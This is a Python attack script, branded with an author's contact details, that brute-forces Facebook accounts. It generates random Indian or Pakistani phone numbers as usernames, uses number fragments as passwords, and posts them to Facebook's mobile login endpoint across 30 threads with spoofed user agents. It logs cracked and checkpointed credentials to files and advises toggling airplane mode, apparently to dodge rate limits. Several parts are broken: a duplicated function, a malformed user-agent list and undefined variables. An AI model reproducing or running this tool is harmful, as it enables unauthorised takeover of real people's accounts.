#!/usr/bin/python3

#-*-coding:utf-8-*-

import os

try:

	import requests

except ImportError:

	print('\n [×] requests module not installed!...\n')

	os.system('pip install requests')

try:

	import concurrent.futures

except ImportError:

	print('\n [×] Futures module not installed!...\n')

	os.system('pip install futures')

    

try:

	import bs4

except ImportError:

	print('\n [×] Bs4 module not installed!...\n')

	os.system('pip install bs4')

    

import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

import base64

import os,sys,time,json,random,re,string,platform,base64

try:

	import requests

	from concurrent.futures import ThreadPoolExecutor as ThreadPool

	import mechanize

	from requests.exceptions import ConnectionError

except ModuleNotFoundError:

	os.system('pip install mechanize requests futures==2 > /dev/null')

	os.system('python num.py')

  

agents = ["Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_1 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A402 Safari/604.1"

				"Mozilla/5.0 (Linux; Android 7.0; PLUS Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"

				"Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko"

				"Mozilla/5.0 (Linux; U; Tizen 2.0; en-us) AppleWebKit/537.1 (KHTML, like Gecko) Mobile TizenBrowser/2.0"

				"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"

				"Mozilla/5.0 (Android 6.0.1; Mobile; rv:43.0) Gecko/43.0 Firefox/43.0"

				"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"

				"Mozilla/5.0 (X11; U; CrOS i686 9.10.0; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Gecko/20100101 Firefox/29.0"]

logo = """\033[1;37;1m 

\033[1;92;1m

\033[1;96;1m

\033[1;91;1m ooooooooo.        .o.          oooo       .o.       

\033[1;97;1m 888   `Y88.      .888.         `888      .888.      

\033[1;93;1m 888   .d88'     .8"888.         888     .8"888.     

\033[1;96;1m 888ooo88P'     .8' `888.        888    .8' `888.    

\033[1;94;1m 888`88b.      .88ooo8888.       888   .88ooo8888.   

\033[1;96;1m 888  `88b.   .8'     `888.      888  .8'     `888.  

\033[1;92;1m o888o  o888o o88o     o8888o .o. 88P o88o     o8888o

\033[1;92;1m               ~ ANCHAL RAJA HAKER ~

\033[1;91;1m[!]=================================================

\033[1;91;1m[!]=================================================

\033[1;92;1m [•] Author   : BILAL SUNNY

\033[1;92;1m [•] Facebook : www.facebook.com.BILAL.SUNNY

\033[1;94;1m [•] Whatsapp : +923493425868

\033[1;96;1m [•] GitHub   : BILAL SUNNY

\033[1;91;1m [•] Virson   : JK.0.19

\033[1;92;1m[!]================================================="""  

loop = 0

oks = []

cps = []

#global functions

def dynamic(text):

	titik = ['.   ','..  ','... ','.... ']

	for o in titik:

		print('\r'+text+o),

		sys.stdout.flush();time.sleep(1)

def menu():

	os.system('clear')

	print(logo)

	print('[1] Random crack')

	print(47*"-")

	opt = input('[?] Choose : ')

	if opt =='1':

		random_crack()

    

def random_crack():

	os.system('clear')

	print(logo)

	print('[1] India Random Uid Crack')

	print('[2] Pak Random Uid Crack')

	print('[3] Bangladesh Random Uid Crack')

	print('[0] Back')

	print(47*'-')

	opt = input('[!] Choose : ')

	if opt =='1':

		random_number()

	elif opt =='2':

		random_pak_number()

	elif opt =='0':

		menu()

	else:

		print('\033[1;91mChoose valid option\033[0;97m')

def random_number():

	user=[]

	os.system('clear')

	print(logo)

	print('[+] For Indian Enter Four Digit Code (9934,9622,9906,)')

	print(47*'-')

	kode = input('[!] Input Code : ')

	print(47*'-')

	limit = int(input('[?] How many numbers do you want to add : '))

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(6))

		user.append(nmp)

	with ThreadPool(max_workers=30) as yaari:

		os.system('clear')

		print(logo)

		tl = str(len(user))

		print('[+] Total Ids : \033[1;92m'+tl)

		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")

		for guru in user:

			uid = kode+guru

			pwx = [guru]

			pwx = [kode+guru]

			yaari.submit(rcrack,uid,pwx,tl)

	print(47*"-")

	print('[✓] Crack process has been completed')

	print('[?] Ids saved in ok.txt,cp.txt')

	print(47*"-")

	print(' Press Inter To Back Menu')

	menu()

	

    

def rcrack(uid,pwx,tl):

	#print(user)

	global loop

	global cps

	global oks

	global agents

	try:

		for ps in pwx:

			session = requests.Session()

			pro = random.choice(agents)

			free_fb = session.get('https://m.facebook.com').text

			log_data = {

				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

			"try_number":"0",

			"unrecognized_tries":"0",

			"email":uid,

			"pass":ps,

			"login":"Log In"}

			header_freefb = {'authority':'m.facebook.com',

			'method': 'POST',

			'scheme': 'https',

			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',

			'cache-control': 'max-age=0',

			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',

			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',

			'sec-fetch-dest': 'document',

			'sec-fetch-mode': 'navigate',

			'sec-fetch-site': 'none',

			'sec-fetch-user': '?1',

			'upgrade-insecure-requests': '1',

			'user-agent': pro}

			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

			log_cookies=session.cookies.get_dict().keys()

			#print(iid+'|'+pws+'|'+str(log_cookies))

			if 'c_user' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[7:22]

				print('\033[1;92m[BILAL-SUNNY-OK] '+cid+' | '+ps+'\033[0;97m')

				open('ok.txt', 'a').write(cid+' | '+ps+'\n')

				oks.append(cid)

				break

			elif 'checkpoint' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[24:39]

				print('\033[1;94m[BILAL-SUNNY-CP] '+cid+' | '+ps+'\033[0;97m')

				open('cp.txt', 'a').write(cid+' | '+ps+'\n')

				cps.append(cid)

				break

			else:

				continue

		loop+=1

		sys.stdout.write('\r\033[1;97m[\033[1;92mJUSTIN\033[1;91m♡\033[1;92mANCHAL\033[1;97m] %s/%s  [\033[1;92mOK\033[1;97m-:\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m-:\033[1;91m%s\033[1;97m]'%(loop,len(self.id),len(ok),len(cp))),

		sys.stdout.flush()

	except:

		pass

def random_pak_number():

	user=[]

	os.system('clear')

	print(logo)

	print('[+] For Pak Enter Four Digit Code (92301)')

	print(47*'-')

	kode = input('[!] Input Code : ')

	print(47*'-')

	limit = int(input('[?] How many numbers do you want to add : '))

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(7))

		user.append(nmp)

	with ThreadPool(max_workers=30) as yaari:

		os.system('clear')

		print(logo)

		tl = str(len(user))

		print('[+] Total Ids : \033[1;92m'+tl)

		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")

		for guru in user:

			uid = kode+guru

			pwx = [guru]

			yaari.submit(rcrack,uid,pwx,tl)

	print(47*"-")

	print('[✓] Crack process has been completed')

	print('[?] Ids saved in ok.txt,cp.txt')

	print(47*"-")

	print(' Press Inter To Back Menu')

	menu()

    

def rcrack(uid,pwx,tl):

	#print(user)

	global loop

	global cps

	global oks

	global agents

	try:

		for ps in pwx:

			session = requests.Session()

			pro = random.choice(agents)

			free_fb = session.get('https://m.facebook.com').text

			log_data = {

				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

			"try_number":"0",

			"unrecognized_tries":"0",

			"email":uid,

			"pass":ps,

			"login":"Log In"}

			header_freefb = {'authority':'m.facebook.com',

			'method': 'POST',

			'scheme': 'https',

			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',

			'cache-control': 'max-age=0',

			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',

			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',

			'sec-fetch-dest': 'document',

			'sec-fetch-mode': 'navigate',

			'sec-fetch-site': 'none',

			'sec-fetch-user': '?1',

			'upgrade-insecure-requests': '1',

			'user-agent': pro}

			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

			log_cookies=session.cookies.get_dict().keys()

			#print(iid+'|'+pws+'|'+str(log_cookies))

			if 'c_user' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[7:22]

				print('\033[1;92m[BILAL-SUNNY-OK] '+cid+' | '+ps+'\033[0;97m')

				open('ok.txt', 'a').write(cid+' | '+ps+'\n')

				oks.append(cid)

				break

			elif 'checkpoint' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[24:39]

				print('\033[1;94m[BILAL-SUNNY-CP] '+cid+' | '+ps+'\033[0;97m')

				open('cp.txt', 'a').write(cid+' | '+ps+'\n')

				cps.append(cid)

				break

			else:

				continue

		loop+=1

		sys.stdout.write('\r\033[1;97m[\033[1;92mJUSTIN\033[1;91m♡\033[1;92mANCHAL\033[1;97m] %s/%s  [\033[1;92mOK\033[1;97m-:\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m-:\033[1;91m%s\033[1;97m]'%(loop,len(self.id),len(ok),len(cp))),

		sys.stdout.flush()

	except:

		pass

menu()
